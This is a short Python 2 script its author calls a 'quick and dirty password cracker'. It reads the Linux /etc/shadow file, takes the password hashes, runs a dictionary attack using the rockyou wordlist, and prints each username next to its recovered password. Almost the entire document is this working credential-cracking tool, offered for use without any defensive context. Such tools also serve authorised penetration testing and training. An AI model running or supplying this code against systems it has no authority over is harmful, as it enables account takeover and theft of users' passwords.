#!/usr/bin/python
'''
This is my quick and dirty password cracker
By Keith

you can manually select the dict file by the arg following the program, if you do not use one rock you will be selected by default from:
/usr/share/wordlists/rockyou.txt

'''
import crypt, sys

fshadow = '/etc/shadow'
fdic = '/usr/share/wordlists/rockyou.txt'
cracked = {}

if len(sys.argv)==2:
    if len(sys.argv[1])>1:
        fdic = sys.argv[1]

print "Dictionary file = " + fdic
try:
    with open(fshadow) as u:
        users = u.readlines()
    
        for user in users:
        
            if "*" not in user and "!" not in user:
                usersplit = user.split(":")
                tmpuser = usersplit[0]
                tmpsalt = usersplit[1][:27]
                tmphash = usersplit[1]
            
                with open(fdic) as d:
                    pwds = d.readlines()
            
                    for pwd in pwds:
                        if ( crypt.crypt(pwd[:-1],tmpsalt) == tmphash ):
                            #print("User: %s | Pass: %s" % (tmpuser,pwd))
                            cracked[tmpuser] = pwd[:-1]
                            break
    print "User | Password"
    print "---------------"
    for user in cracked:
        print user+" | "+cracked[user] 
    print("---------------")
    print("%s passwords cracked" % len(cracked))


except:
    print('[-] Error... "%s [/path/file.txt]"' % sys.argv[0] )
    exit(-1)
